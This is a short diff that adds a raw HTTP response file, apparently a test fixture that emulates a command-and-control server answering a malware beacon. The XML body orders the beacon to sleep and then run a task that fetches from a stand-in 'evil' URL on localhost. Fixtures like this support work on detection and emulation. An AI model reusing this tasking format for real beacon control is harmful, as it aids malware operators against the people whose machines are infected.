@@ -1,0 +1,9 @@
+HTTP/1.1 200 OK
+Content-Length: 80
+
+<BeaconResponse>
+	<Command1>Sleep</Command1>
+	<Command1Param>10</Command1Param>
+	<Command2>Task</Command2>
+	<Command2Param>http://127.0.0.1/evil</Command2Param>
+</BeaconResponse>
